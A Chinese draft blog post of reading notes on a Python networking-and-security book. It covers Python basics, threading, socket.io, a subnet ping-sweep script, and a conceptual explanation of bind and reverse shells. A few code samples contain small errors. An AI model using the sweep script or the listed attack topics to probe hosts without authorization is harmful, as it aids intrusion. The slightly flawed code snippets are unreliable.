---
title: "python網路與安全閱讀心得"
date: 2021-07-26T10:00:44+08:00
draft: true
featured_image: "/secure.jpg"
tags: ["secure","python","network"]
---
### 本篇引用自Mastering python for networking and security一書  
### 文中所有範例都來自該書本與該書本的範例網站

書本的範例儲存庫:  
https://github.com/PacktPublishing/Mastering-Python-for-Networking-and-Security-Second-Edition

<span id="menu-location"></span>

## 目錄

### 第一章
從目錄來看，第一章似乎談到python3的一些基礎使用  
<a href="#chapter1">跳到第一章</a>  

### 第二章
第二章則是網路腳本，一些基礎的socket與http requests  
除外還有額外介紹reverse shell與ncat工具  

<a href="#ncat">跳到ncat工具</a>   
<a href="#ipdomain">跳到IP domain ,address</a>  
<a href="#portscan">跳到port scan</a>  
<a href="#socketclientserver">跳到用socket製作TCP的client與server端</a>  
<a href="#udpclientserver">跳到用socket製作UDP的client與server端</a>  
<a href="#httplearn">跳到HTTP程式撰寫</a>  
<a href="#urllib">跳到用urllib下載程式,取得header,建立請求</a>    
<a href="#requests">跳到requests模塊建立請求</a>    
<a href="#httpx">httpx的HTTP客戶端與異步編程</a>  
<a href="#httpauthentication">HTTP認證機制(authentication)</a>  
<a href="#tor&hidden_device_dicover">連接到TOR網路與發現隱藏的設備</a>  
<a href="#tor_service">讓普通連網通過Tor</a>  
<a href="#build_hidden_service">建立Hidden service與利用暗網通話</a>  
<a href="#discover_hidden_service">如何發現Hidden service!?</a>  
<a href="#check_onion_url">大量檢查暗網網址的有效性</a>  
<a href="#onion_scan">暗網網址的匿名性與弱點檢查</a>  
<a href="#ExifTool">ExifTool來觀察圖片的元數據</a>  
<a href="#DockerOnionNmap">DockerOnionNmap隱藏自身位置進行NMAP掃描</a>  
<a href="#ProxychainsOnionDNS">Proxychains與Onion網址</a>  
<a href="#FromPythonToTor">使python程式連結到tor網路</a>  
<a href="#TorSocks&Socket">用Tor的SocksProxy進行socket傳輸</a>  
<a href="#tor&stem">Stem模塊控制Tor行為</a>  
<a href="#tor&stem&ip_change">用stem轉換洋蔥IP</a>  

### 第三章
第三章則是python的伺服器腳本，有討論到DNS協議與shadon搜尋引擎的API  
非常有意思的是，這個shadon搜尋引擎可以搜尋到暴露在網路的物連網設施。(如果沒有特別關閉對ICMP的回應。）  
還有nmap的python應用  

<a href="#serverscript">伺服器腳本與port掃描</a>  
<a href="#about-shodan">關於Shodan</a>  
Python執行Shodan搜索(未完成)  
BinaryEdge搜索(未完成)  
<a href="#socket-server-info">用socket取得伺服器基本訊息</a>  
<a href="#vulnerabilities-info">常見的漏洞清單網站</a>  
<a href="#dns-python-info">查詢DNS相關資訊</a>  
<a href="#fuzzing-address-scan">fuzzing弱點位址掃描</a>  
<a href="#fuzzing-sql-scan">fuzzDB偵測SQL Injection漏洞</a>  
<a href="#python-ftp-sftp-ssh">用Python與FTP,SFTP,SSH伺服器進行通訊</a>  
<a href="#python-ftplib">使用ftplib來進行FTP傳輸</a>  
<a href="#python-ftplib-BruteForce">使用ftplib來進行brute-force猜測FTP伺服器帳號密碼</a>  
<a href="#about-ssh">關於SSH</a>  
<a href="#ubuntu-debian-install-ssh-server">Ubuntu與Debian安裝SSH伺服器與設置用戶</a>  
<a href="#python-paramiko">使用paramiko自動化執行SSH腳本</a>  
<a href="#ssh-brute-force-paramiko">使用paramiko進行SSH Brute Force</a>  
<a href="#about-pysftp-paramiko">paramiko與pysftp</a>  
<a href="#asyncSSH-SSH-client">用asyncSSH來實做SSH客戶端</a>  
<a href="#ssh-audit">安裝ssh-audit來檢查SSH server的配置</a>  
<a href="#Rebex_SSH_Check">Rebex SSH Check網站檢查SSH安全性</a>  
<a href="#nmap-about">NMAP掃描主機</a>  
<a href="#python-nmap">用python啟動NMAP</a>  
<a href="#python-script">用NMAP腳本進行弱點掃描</a>  

### 第四章
伺服器弱點與python的安全模塊  
有介紹如OpenVAS一類的弱點掃描工具  
與關於防堵XSS漏洞的資訊  
SQLinjection的防範  
<a href="#GVM">GVM掃描弱點</a>  

### 第五章
python鑑識技術  

---

## 第一章
第一章從python的基礎資料結構開始探討。  
<span id="chapter1"></span>
### list
類似C++中的vector  

### 添加元素
```python
my_list=[] 
my_list.append("a")
my_list.append("b")
my_list.append("c")
# 此時list內容為 ["a","b","c"]
```
### 定位元素
```python 
my_list.index("a") #回傳0
my_list.index("b") #回傳1
my_list.index("c") #回傳3
```

### 刪除元素
```python 
my_list.remove("a") 
```

### 印出所有元素
```python 
for i in my_list:
    print(i)
```

還有其他的method可以來操作list  
例如:  
    .count() 數元素  
    .sort() 排列  
    .pop()彈出  
    .insert(位置,插入的值)  
    .reverse() 反轉  
  
### Tuples
類似list但是其中的元素不能改變，可以視為read only版本的list  
同時不能添加新元素，或改變大小  

### dictionaries
採取key,value的型態來儲存資料。  
  
簡單的宣告。  
```python
 services = {"ftp":21, "ssh":22, "smtp":25, "http":80}
```
用update更新內容，也就是將新dictionaries的內容加入舊的dictionaries  
```python
 services = {"ftp":21, "ssh":22, "smtp":25, "http":80}
 new_services = {"ftp":21, "ssh":22, "snmp":161, "ldap":389}
 services.update(new_services)
 print(services)
```
結果為：  
{"ftp":21, "ssh":22, "smtp":25, "http":80,"snmp":161,
"ldap":389}  
新字典的內容加入舊字典了  

---

## function

### 1.builtins-function
python中不可或區的預設函數  
處理一些如class等基本功能  
可以使用dir來檢查builtins裡頭的內容  
```python
import builtins
dir(buildins)
```

### 2.使用者自訂函數

### 3.lambda函數
可以視為簡化的函數表示方法。  
例如以下的一個乘法函數：
```python
product = lambda x,y : x * y
```

## class
python中的class特殊之處在於，要呼叫或宣告class裡頭的變數，需要採用self。  

```python
class Obj:
    __init__(self,name):
        self.name=name
```
值得注意的是，init函數無論如何都必須傳入self。  
class中的變數也要在init函數中定義。  
而且self一定要擺在init的參數。  
self的意義接近C++中的pointer。  
  
此外，所有的class都隸屬於superclass，所以class之間存在某種階層。  

### 1.繼承
python當中的繼承方式，是將父類別的內容放入子類別建立的括弧中。  
在以下範例之中，python已經事先存在list類別。  
我們建立的my list就是繼承python原本的list類別
```python
#my list繼承於父類別lisy
class MyList(list):
    def max_min(self):
    return max(self),min(self)

#實例化myList
myList= MyList()
```

---

## 錯誤處理

在這個範例中，我們客製化了  
"除以零錯誤"  

```python
try:
    print("10/0 = ",str(10/0))
except Exception as exception:
    print("錯誤為",str(exception))
```
不過其實，except裡頭也可以改成別的內容，  
例如讓程式主動處理錯誤的方法。  
```python
try:
    print(1/0)
except:
    i=int(input("輸入錯誤，請重新輸入"))
    print(1/i)
```
(P.43)

---

## 模塊

模塊包含了class,函數,變數...等，被包裝在一個單一的.py檔  

以下為一個最簡單的建立模塊的方法：  
1. 先建立一個檔案名叫my_module.py
2. 裡頭放入一個函數
3. 在要調用函數的檔案中輸入
    ```python
    import my_module
    ```
    完成後就可以直接調用裡頭的函數  

(p.47)
### 檢查模塊裡頭的方法
用這樣來顯示出模塊中的方法與實體（entities）
```python
import os
dir(os)
```
這樣就會列出模塊中的眾多方法與實體了  

### 模塊與套件的區別
模塊 module :一個python檔案，內含類別,變數,函數，能夠被引入。  
套件 package:一個modlue但是該模塊引入了一個或多個模快。  
(p.48)  

## 參數管理
(p.48)
當我們要用命令行輸入參數執行python檔案時，通常是這樣  
```bash
python3 main.py 參數一 參數二
```
而這種時候參數就會被存到  
``` 
sys.argv 
```
這個陣列裡頭，可以import sys來調用  
但是由於要手動解析字串太過麻煩，所以有專用的內建模快來處理這個任務  
也就是argparse模塊  
```python
import argparse

#放入這個python檔案描述
parser = argparse.ArgumentParser(description='Testing parameters')

#增加參數 -p1 存入變數param1
parser.add_argument("-p1", dest="param1", help="parameter1")
#增加參數 -p2 存入變數param2
parser.add_argument("-p2", dest="param2", help="parameter2")
#取得輸入參數
params = parser.parse_args()

print("Parameter 1",params.param1)
print("Parameter 2",params.param2)
```
指定整數形別的方法  
```python
parser.add_argument("-param", dest="param", type="int")
```
課本上的範例做出了一個專門處理輸入參數的類別  
```python
from optparse import OptionParser

#取得參數的類別
class Parameters:
"""Global parameters"""
    # 順帶一題，**kwargs 能夠讓你輸入數量不指定的參數，不限制參數一定要是1,2,3個
    def __init__(self, **kwargs):
     self.param1 = kwargs.get("param1")
     self.param2 = kwargs.get("param2")

#查看參數的函數
def view_parameters(input_parameters):
    print(input_parameters.param1)
    print(input_parameters.param2)
    parser = OptionParser()
    parser.add_option("--p1", dest="param1", help="parameter1")
    parser.add_option("--p2", dest="param2", help="parameter2")
    (options, args) = parser.parse_args()

input_parameters = Parameters(param1=options.param1,param2=options.param2)
view_parameters(input_parameters)
```
作者相信這是個可以簡化存取參數的方法  
OptionParser可以某種意義上簡化參數存取  
並且拋出特定錯誤，是一個額外的選項  

(p.51)
## 用pip3 安裝所有需要的套件
我們先將需要的模塊寫進requirements.txt文字檔中  
```bash
pip3 install -r requirements.txt
```
輸入上方的命令行，pip3就會將所有需要的模塊安裝好了  
生成 requirements.txt 檔案時可以是用一個模塊pipreqs
```bash
pip3 install pipreqs
```
安裝好後的使用方式  
在目前目錄下使用
```bash
pipreqs ./
```
(p.54)

---

# 系統程式套件
(p.60)

這個章節似乎是在探討主要與系統交互的一些套件  
同時也會探討多執行緒與檔案讀寫  
並且在章節最後會實做非同步伺服器與socket.io  

## sys.argv陣列
sys.argv可以有數個參數  
以下為使用方式  
```python
import sys
print(sys.argv)
```
第一個參數必然是文件名稱  
```python
sys.argv[0]
```
如果我們的檔案名稱是file.py  
然後我們輸入  
```python
python3 file.py 第一個參數 第二個參數
```
這時
```python
sys.argv[1]
```
就是"第一個參數"

---

透過sys檢查平台,python版本與編碼  
例如使用linux時  
```python
sys.platform
```
裡頭的數值是"linux"  

---

如果使用python 3.8時
```python
sys.version
```
的數值是3.8（而且同時也會顯示gcc的版本）  

---

這個數值會顯示出當前文件系統使用的編碼方式  
```python
sys.getfilesystemencoding()
```

(p.63)

python編譯器與套件的目錄  
```python
sys.path
```

## os作業系統套件
用來與作業系統交互，尋找檔案,資料夾...等一類的。  
我們參閱書上的代碼。  
```python
import sys
import os

# 如果輸入的參數是一個(sys.argv[0]是檔案名稱，sys.argv[1]才是我們輸入的參數)
if len(sys.argv) == 2:
    filename = sys.argv[1]
    print(filename)

#如果我們輸入的路徑是檔案
if os.path.isfile(filename):
    # 顯示檔案已經存在
    print(‘[+] ‘ + filename + ‘ does exist.’)
    exit(0)

#如果我們輸入的路徑不是檔案
if not os.path.isfile(filename):
    #顯示檔案不存在
    print(‘[+] ‘ + filename + ‘ does not exist.’)
    exit(0)

#如果該檔案無法存取
if not os.access(filename, os.R_OK):
    #顯示存取被拒絕
    print(‘[+] ‘ + filename + ‘ access denied.’)
    exit(0)
```

### os.getcwd()
os.getcwd()  
可以顯示目前的工作目錄  
os.listdir(路徑)  
可以列出資料夾下的檔案內容  
```python
import os
pwd = os.getcwd()
list_directory = os.listdir(pwd)
for directory in list_directory:
    print(‘[+] ‘,directory)
```

### os.system()

可以讓作業系統以預設的shell執行指令，  
例如bash shell 中的 ls  

### os.walk()
該函數也是一個可以遍歷資料夾內元素的函數  
```python
import os

#root是當前的根目錄，files是目前目錄下，directories是目前目錄下的資料夾
for root, directories, files in os.walk(".",topdown=False):
    # root為當前的工作目錄
    for file_entry in files:
        # create the relative path to the file
        print(‘[+] ‘,os.path.join(root,file_entry))
    #列出所有資料夾
    for name in directories:
        print(‘[++] ‘,name)
```
因為os.listdir會忽視特定路徑  
所以os.walk()在取得資料夾詳細路徑時非常重要  

### os.walk計算當前目錄下的檔案數量
```python
import os
from collections import Counter
counts = Counter()
for currentdir, dirnames, filenames in os.walk('.'):
    for filename in filenames:
        first_part, extension = os.path.splitext(filename)
        counts[extension] += 1
for extension, count in counts.items():
    print(f"{extension:8}{count}")
```
運作結果
```
python3 count_files_extension_directory.py 
.py     6
.txt    1
```
(p.67)

### platform模塊來識別作業系統
舉例來說，雖然python是跨平台的程式語言  
但是如果要調用shell的話，windows的cmd ,powershell與linux常用的bash  
指令上來說總是不同的。  
下列的代碼巷我們展示了，如何在windwos與linux下做出不同行為  
這種情況下我們要用platform模塊  

```python
import platform
operating_system = platform.system()
print("Your operating system is: ",operating_system)
if (operating_system == "Windows"):
    ping_command = "ping -n 1 127.0.0.1"
elif (operating_system == "Linux"):
    ping_command = "ping -c 1 127.0.0.1"
else :
    ping_command = "ping -c 1 127.0.0.1"
print(ping_command)
```

在該模塊中可以看到python的實做語言    
下列函數，如果我們用官方的cpython就會顯示出來。
```python
python_implementation() 
```

而如果要顯示仔細的版本號，可以用下列函數。
```python
python_version_tuple()
```
會回傳  
```
(3,8,5)
```

## subprocess子程序
子程序，推薦用來處理作業系統指令，或是管理其他的python程序。  
並且可以將訊息輸入，輸出，從子程序擷取錯誤訊息。  
```
#函數

執行一個指令，等待它完成，並且回傳一個程序完成的物件實例。
run(...)

在一個新程序中靈活的執行指令
Popen(...)

#常數
DEVNULL: 表示 os.devnull 應該被使用。
PIPE: 表示程序間通訊應該被建立。
STDOUT: 表示標準錯誤 stderr（標準錯誤）應該被stdout(標準輸出)輸出
```
### 簡單的使用call()呼叫子程序
我們用以下的例子進行比較，比較os模塊，與subprocess中的call()的差異  
兩者其實都能進行同樣的工作。  
```python
import os
from subprocess import call
os.system("ls -la")
call(["ls", "-la"])
```

### Popen()函數呼叫子程序
Popen()其實比call還多了一些控制力，例如有辦法臨時關閉特定的子程序。
```python
#啟動子程序檢查python
process = subprocess.Popen([“python”, “--version”]) 
#刪除子程序
process.terminate()
```
(p.69)

### 子程序與父程序的行程間通訊

<div style="color:green"">
註記:<br> 
stderr雖然字面上看起來是處理錯誤用的，<br>
但這個的主要功能是將結果輸出而且如右需要可以留下紀錄檔。<br>
stdout與stderr都可以在終端機上頭顯示文字<br>
而pipe則是用來使父程序與子程序進行通信用的。<br>
</div>

以下範例使用Popen產生ping的子程序，並且使用pipe通訊。
```python
import subprocess
import sys
command_ping = '/bin/ping'
ping_parameter ='-c 1'
domain = "www.google.com"

# shell=False 不讓子程序的內容直接顯示在畫面上造成混亂，
# stderr=subprocess.PIPE 將子程序的輸出傳入stderr (我猜stdout也可以？)
p = subprocess.Popen([command_ping,ping_parameter,domain],
shell=False, stderr=subprocess.PIPE)
#將程序的stderr中的輸出內容存入out
out = p.stderr.read(1)
# 將內容先村入緩衝區，stdout的內容其實都預先存在緩衝區
sys.stdout.write(str(out.decode(‘utf-8’)))
# 將緩衝區的內容輸入到螢幕
sys.stdout.flush()
```

### ping掃描在網路上頭允許ICMP的主機

```python
#!/usr/bin/env python
import subprocess
import sys
import argparse

#程式按下--help後的註解
parser = argparse.ArgumentParser(description='Ping Scan Network')
    
#兩個主要參數
#-network 用來輸入你要搜尋的ipv4範圍的前三個字，例如192.168.0.1~192.168.0.10，就輸入192.168.0
#-machines用來輸入你要搜尋的主機數量，從上頭那行來看數量是10個
parser.add_argument("-network", dest="network", help="NetWork segment[For example 192.168.56]", required=True)
parser.add_argument("-machines", dest="machines", help="Machines number",type=int, required=True)

#將取得的參數傳入parsed_args物件
parsed_args = parser.parse_args()    

#迴圈運作時，會從1開始，到你要要搜尋的機器數量加一，因為192.168.0.0是用來標示該網段的，不可直接使用
for ip in range(1,parsed_args.machines+1):
    #將ip拼接，192.168.0 與 .1相加 
    ipAddress = parsed_args.network +'.' + str(ip)
    print("Scanning %s " %(ipAddress))
    #如果在linux主機上
    if sys.platform.startswith('linux'):
        # Linux
        output = subprocess.Popen(['/bin/ping','-c 1',ipAddress],stdout = subprocess.PIPE).communicate()[0]
    elif sys.platform.startswith('win'):
        # Windows
        output = subprocess.Popen(['ping', ipAddress], stdin=PIPE, stdout=PIPE, stderr=PIPE).communicate()[0]
    output = output.decode('utf-8')
    print("Output",output)
    #"如果封包丟失為0"或"bytes來自"，等字串出現顯示該ip存在主機
    if "Lost = 0" in output or "bytes from " in output:
        print("The Ip Address %s has responded with a ECHO_REPLY!" % ipAddress)
```

以下是掃描五台電腦的指令：

```bash
python3 PingScanNetWork.py -network 192.168.56 -machines 5
```

## python檔案系統
(p.71)

### 確認當前目錄下檔案或資料夾是否存在  
```pythno
 os.path.exists(“file.py”)
```

### 產生一個資料夾
```pythno
os.makedirs(‘my_directory’)
```

### 普通檔案讀寫

#### 打開檔案
open函數可以回傳一個檔案操作物件。  
裡頭的參數為open(檔案名稱,讀寫模式)  
讀寫模式分三種：  
r:讀取模式  
w:寫入模式  
a:文字末尾添加模式  
b:二進位模式  
t:文件模式  
r+,w+,a+:同時可以讀與寫模式  
rt,wt,at:同時可以讀與寫文字文件格式(如果文件不存在則會重新建立)  
```python
my_file=open("file.txt","w+")
```
在此時my_file就是我們可以存取的檔案讀寫物件。
#### 寫入字串
```python
my_file.write(字串) 
```
#### 讀取字串
讀取字串時，設置緩衝區大小可以決定一次要讀多少字。  
如果沒有設置時，會一口氣把整個檔案通通讀完。  
```python
my_file.read([緩衝區大小]) 
```

#### 一次讀取一行
此函數用作一次讀取一行
```python
my_file.readline() 
```

#### 一次讀取數行
緩衝區大小決定一次要讀的行數  
如果沒有設置，就會一次讀完整個檔案  
並且回傳一個裝著一行又一行的字串的list  
```python
my_file.readlines([緩衝區大小])
```

#### 關閉檔案
```python
my_file.close()
```
(p.73)

### 相對安全檔案讀寫（context manager和with語句）

正常情況下，我們使用open來打開檔案，用close來關閉檔案。  
但是有的時候如果忘記close，或者程式還沒跑到close就自己意外關閉了。（有時也會產生錯誤警告）  
這時候啟動的文字文件無法釋放，有可能會造成其他程式無法存取，或是無謂的記憶體耗用。  
我們可以用with語法來自動在執行存取結束後自動關閉資源。  
也就是說，不需要手動close()資源。  

#### with語法

在下方這種情況下，file這個物件會自動關閉。  
```python
#主函數
def main():
    with open('test.txt','w') as file:
        file.write("this is a test file")

if __name__ == '__main__':
    main()
```
以下為一個完整的文件寫入範例  
```python
def main():
	try:
		with open('test.txt', 'w') as file:
			file.write("this is a test file")
	except IOError as e:
		print("無法寫入文件 ", e)
	except Exception as e:
		print("其他錯誤", e)
	else:
		print("文件寫入成功")


if __name__ == '__main__':
    main()
```
(p.76)

### python打開zip壓縮檔

可以使用zipfile模塊來檢視zip壓縮檔的內容  
```python
#!/usr/bin/env python3
import zipfile
def list_files_in_zip(filename):
    with zipfile.ZipFile(filename) as myzip:
        for zipinfo in myzip.infolist():
            yield zipinfo.filename
 
for filename in list_files_in_zip("files.zip"):
    print(filename)
```

## python中的執行緒(thread)
(p.77)
thread可以在不同CPU core上頭平行處理某些任務。  
需要注意的是，我們沒辦法用普通函數庫直接與kernel-level thread進行互動。  
在此處指的thread僅僅為user-level thread  

### 初始化thread

啟動thread時，會產生一個管理thread用的物件，  
在下列例子中myFirstThread就是我們的物件，我們可以用他來啟動thread  

```python
import threading

def myTask():
    print("Hello World: {}".format(threading.current_thread()))

# 我們將myTask函數送入thread裡頭
myFirstThread = threading.Thread(target=myTask)
# 啟動thread
myFirstThread.start()
```

### 如何一次產生多個thread而每個行為都不同
由於在thread中要放置函數來運作，  
用for迴圈產生大量thread時，仍然可能視同一個函數  
所以我們可以改變輸入的參數，來修改thread的行為  
```python
import threading
import time

num_threads = 4

def thread_message(message):
	global num_threads
	num_threads -= 1
	print('Message from thread %s\n' %message)

while num_threads > 0:
	print("I am the %s thread" %num_threads)
	threading.Thread(target=thread_message("I am the %s thread" %num_threads)).start()
	time.sleep(0.1)
```
結果為  
```
I am the 4 thread
Message from thread I am the 4 thread

I am the 3 thread
Message from thread I am the 3 thread

I am the 2 thread
Message from thread I am the 2 thread

I am the 1 thread
Message from thread I am the 1 thread
```
小提醒:可以用help()函數來看看threading的說明:help(threading.Thread)  

### 介紹threading模塊
(p.79)
我們注意到上方呼叫一個新的thread時是採用threading.Thread()  
而現在我們要來探討Thread()是什麼  
Thread是個類別，而我們傳入的參數，會進入到它的建構子中。  
讓我們來瞧瞧Thread()可以傳入哪些參數?  
```python
def __init__(self, group=None, target=None, name=None, args=(),
kwargs=None, verbose=None):
```
group:以後才有這個參數  
target:要放入thread中執行的函數或物件，會被run()運作  
name:tread的名稱  
args:target需要調用的參數，以tuple型態傳入  
kwargs:dictionary型態的傳入參數，數量可以複數  
  
更多的內容可以參見help(threading) 

### 用繼承方式來建立thread
(p.80)  
我們仔細觀察下列類別  
MyThread 繼承了threading.Thread  
然後我們將注意力轉到run()方法  
在run方法中，我們的行動將會成為放入thread的內容  
除外init方法中，我們為了設定message所以覆蓋了原本的建構子，  
在這個前提下，就要重新呼叫父類別的建構子  
threading.Thread.\_\_init\_\_(self)  
至於底下的timeit是用來測量執行時間的，對thread來說不是必要  
```python
import threading

class MyThread(threading.Thread):

    def __init__ (self, message):
        threading.Thread.__init__(self)
        self.message = message

    def run(self):
        print(self.message)

def test():
    for num in range(0, 10):
        thread = MyThread("I am the "+str(num)+" thread")
        thread.name = num
        thread.start()

if __name__ == '__main__':
    import timeit
    print(timeit.timeit("test()", setup="from __main__ import test",number=5))
```
我們關注運作結果的時候會略為訝異。
```
I am the 2 thread
I am the 3 thread
I am the 4 thread
I am the 5 thread
I am the 6 thread
I am the 7 thread
0.003927593999833334
I am the 9 thread
I am the 8 thread
```
為什麼不會完全按照順序執行每個thread?  
計時程式怎提早回傳了個(不是很正確)的結果?  
這就是平行化運算的優點與缺點  
當不同的任務分配給不同的cpu核心時，很難確保哪個任務先完成？哪個任務後完成？  

### thread.join()等待thread運作結束
上一個篇幅提到的，無法預測thread執行完成的先後的狀況，可以用這種方式來改善  
thread.join()可以要求join後續的代碼，在該thread結束後再執行。  
可以用在運作多個thread後，需要某個程式來蒐集結果時  
.join()可以傳入浮點參數，作為等待thread完成的最大秒數  
```python
import threading

class thread_message(threading.Thread):

    def __init__ (self, message):
        threading.Thread.__init__(self)
        self.message = message

    def run(self):
        print(self.message)

threads = []

def test():
    for num in range(0, 10):
        thread = thread_message("I am the "+str(num)+" thread")
        thread.start()
        threads.append(thread)
    #  wait for all threads to complete by entering them
    for thread in threads:
        thread.join()

if __name__ == '__main__':
    import timeit
    print(timeit.timeit("test()", setup="from __main__ import test",number=5))

```

## 平行化運算與thread
(p.82)
使用繼承方法來運作thread的另一個案例。  
由於父類別threading.Thread()裡頭的\__init__()方法必須被呼叫。  
所以當我們繼承之後，一定要回頭來呼叫父類別的\__init__()  
具體的方法是，使用super函數。  
範例如下:  

```python
import threading

class ThreadWorker(threading.Thread):

    # Our workers constructor
    def __init__(self):
        super(ThreadWorker, self).__init__()

    def run(self):
        for i in range(10):
           print(i)
```

## python中thread的限制
python中的thread不總是平行的，  
甚至一次只能執行一個thread  
因為python中執行thread由GIL(全局解釋鎖)控制。  
無法達到真正的將thread分散到不同的CPU核心處理。  
但仍然可以達成，在等待I/O時繼續進行其他運匴處理的功能。  
(p.84)

為了最小化GIL對thread帶來的負面影響，  
我們在啟動python直譯器時可以加入參數 -O  
來對於python bytecode 進行最佳化  
達到更少的context switch 與 運用更少的指令  
```bash
python3 -O main.py
```
為了避開thread 的限制性，我們也可以用 multiprocess進行平行運算。  
__multiprocessing__ 模塊可以達到這個要求，並且操作方式類似thread。  

## python中ThreadPoolExcutor
這一個達成異步運算的方法。  
透過事先建立thread pool(執行緒池)。  
來限制將要使用的thread。  

在下列的code中，我們限制最大能夠同時運作的thread只有5個。  
```python
executor = ThreadPoolExecutor(max_workers=5)
```
假定我們今天要執行在thread的函數是
<div style="color:red""> myFunction() </div>
我們將會用以下的方式將myFunction()送入thread pool中。  
並且是異步執行，也就是說如果該函數等待I/O許久，程式其他部份仍可運作。  

```python
executor.submit(myFunction())
```

以下為具體的使用方式。  

```python
from concurrent.futures import ThreadPoolExecutor
import threading
import random

def view_thread():
    print("Executing Thread")
    print("Accessing thread : {}".format(threading.get_ident()))
    print("Thread Executed {}".format(threading.current_thread()))

def main():
    executor = ThreadPoolExecutor(max_workers=3)
    thread1 = executor.submit(view_thread)
    thread1 = executor.submit(view_thread)
    thread3 = executor.submit(view_thread)
	
if __name__ == '__main__':
    main()
```
(p.85)
以下這個方法可以取得thread id  
```python
threading.get_ident()
```
以下這個方法可以取得當前執行executor的一些細節。  
```python
threading.current_thread()
```

### 用context manager (with語法)執行ThreadPoolExecutor

```python
from concurrent.futures import ThreadPoolExecutor

def message(message):
 print("Processing {}".format(message))

def main():
 print("Starting ThreadPoolExecutor")
 with ThreadPoolExecutor(max_workers=2) as executor:
   future = executor.submit(message, ('message 1'))
   future = executor.submit(message, ('message 2'))
 print("All tasks complete")
  
if __name__ == '__main__':
 main()
```
<a href="#menu-location">跳到目錄</a>  
## python的socket.io
(p.87)

### WebSockets

透過TCP協定實時通訊的技術。  
client端不需要持續的呼叫API來確認是否有新訊息要接收。  
而是直接建立一個socket直接監聽server端發出的所有事件。  
同時有著大量用戶聯繫著伺服器時，可以簡化通訊過程減輕負擔。  
(如果每個用戶每次都送一整個完整前後文的http request，處理起來更加費時)  

### 實做sockets.io的模塊

以下為兩個實做sockets.io的模塊

#### asyncio介紹
能用於單一thread的同時傳輸。

#### aiohttp介紹
可以簡單建立server與client的模塊。  
該模塊原生使用WebSockets來用於通訊應用程式的各個部份。  

---

### aiohttp實做server端

#### 需求套件安裝

```
pip3 install python-socketio
```

```
pip3 install aiohttp 
```

```
pip3 install requests
```

#### 先備知識
在我們正式開始製作server端之前，我們要先分析等等會用上的幾個語法與保留字  

##### async
異步執行。  
如果要理解異步執行，可以先理解正常python的運作。  
一般情況下，python會停下等待I/O(例如漫長的網路傳輸,硬碟讀取或用戶回應)完成後才執行下一行。  
但這種情況用在網路上的伺服器是不太恰當的。  

#### socket_io.attach(app)
關於這個寫法，直接將web app傳入socket_io或許有人會感到困惑  
但是這種寫法是python-socketio模塊官方預定的，  
雖然不一定符合每個人的直覺，但是該物件就是如此設計的。  
詳細內容請參見官方文件:

https://python-socketio.readthedocs.io/en/latest/intro.html

##### @socket_io.on('message')
@socket物件.on('message')會在收到client從socket傳來訊息時  
觸發下方的函數。  
```python
@socket_io.on('message')
def print_message(socket_id,data):
```

##### app.router.add_get('/', index)
這行有點類似許多的現代網頁框架的路由寫法  
當有人用http request中的get 方法訪問網頁的根目錄(例如:https://127.0.0.1/)時  
會自動執行我們的index函數。  

##### 預設port
aiohttp預設的port為8080  

#### 程式實做  
以下就是同時具有網頁與socket功能的異步簡易web server的範例
```python
from aiohttp import web
import socketio

socket_io = socketio.AsyncServer()
app = web.Application()
socket_io.attach(app)

async def index(request):
    return web.Response(text='Hello world from socketio',content_type='text/html')

@socket_io.on('message')
def print_message(socket_id,data):
    print("Socket ID: " , socket_id)
    print("Data: " , data)

app.router.add_get('/', index)

if __name__ == '__main__':
    web.run_app(app)
```

### aiohttp實做client端

#### 需求套件安裝
同server端  

#### 先備知識

##### @sio.event
連線時觸發
```python
@sio.event
def connect():
```

解除連線時觸發
```python
@sio.event
def disconnect():
```

連線
```python
sio.connect('http://localhost:8080')
```
發送訊息
```python
sio.emit('message', {'data': 'my_data'})
```
等待與確認訊息送達
```python
sio.wait()
```
#### client端實做
```python
import socketio

sio = socketio.Client()

@sio.event
def connect():
    print('connection established')

@sio.event
def disconnect():
    print('disconnected from server')

sio.connect('http://localhost:8080')
sio.emit('message', {'data': 'my_data'})
sio.wait()

```
## 第一章後續閱讀
io管理  
 https://docs.python.org/3.7/tutorial/inputoutput.html  
thread管理  
https://docs.python.org/3.7/library/threading.html  
GIL的影響與說明  
https://realpython.com/pythongil  
concurrent.futures說明  
https://docs.python.org/3/library/concurrent.futures.html  
aiohttp網頁伺服器文檔  
https://docs.aiohttp.org/en/stable  
asyncio異步io說明  
https://docs.python.org/3.7/library/asyncio.html  
Flask網頁伺服器  
https://flask.palletsprojects.com/en/1.1.x  
Django  
https://www.djangoproject.com  

# 第二章 網路腳本與從Tor網路中提取信息
<span id="chapter2"></span>
(p.92)
## Socket程式撰寫
本章節會實做http,tcp,udp伺服器。  
並且會示範用socket 實做 reverse shell。  
### Reverse shell 是啥呢？  

先假設我們有類似netcat的程式被放入受害者的主機裡頭。

#### Bind shell
首先如果有一天一台暴露在網路上的，普通網站主機，被安裝了一個小程式，會一直偵聽某個port。然後攻擊者偶爾會向那個公開的port傳送shell指令，讓受害者執行這些指令。  但是一旦遇到防火牆，而且防火牆不開放那個受害主機偵聽的port，那攻擊者是不可能把指令傳達到該port的。  

#### Reverse shell
讓受害者自己去主動連線攻擊者開放的port，這樣就能避開防火牆的限制。但這個前提，攻擊者必須在網路上開放一個port來讓受害者存取，並且接收攻擊指令。  

### socket的實做
產生一個socket的物件實例，只要簡單的呼叫下列方法就可以了。
```python
 socket.socket()
```
但是這個方法有一些參數的。我們來瞧瞧下方的範例。
  
#### socket_family：
一般輸入 socket.AF\_INET這個是用在ipv4上頭 ，在這個欄位可以決定socket可以建立在ipv6(socket.AF\_INET6)之上或Unix 本機上(socket.AF\_UNIX)。甚至還有一種方式可以直接調整通訊協定，自由選擇Layer3網路層或Layer4的傳輸層。(socket\_raw)，在此種狀態下，我們可以直接看到接收到的封包內容，這種方式可以讓我們建立新的通訊協定，或調整現有的通訊協定。 

#### socket_type：
tcp時用socket.SOCK\_STREAM ，udp時用socket.SOCK\_DGRAM  
```python
s = socket.socket (socket_family, socket_type, protocol=0)
```
### 補充scapy套件
scapy套件能夠生成封包，並且擷取封包。很適合拿來追蹤或者進行封包嗅探與網頁API單元測試。  

### raw socket
沒有對應到特定的協定，如tcp,udp...等的socket傳輸。  
AF_PACKET family: 可撰寫任何不同層的傳輸header。  
AF_INET family:會代理作業系統撰寫header，可以選擇幾種不同的header。  
更多raw socket的說明:  
https://docs.python.org/3/library/socket.html#socket.SOCK_RAW  
(p.96)  

## socket模塊
socket模塊是預先安裝在python中的，無須額外安裝。

### server端
server端會監聽一個port，等待client端發送服務請求，並且加以回應。  

### client端
client會發送訊息連接到server端。  

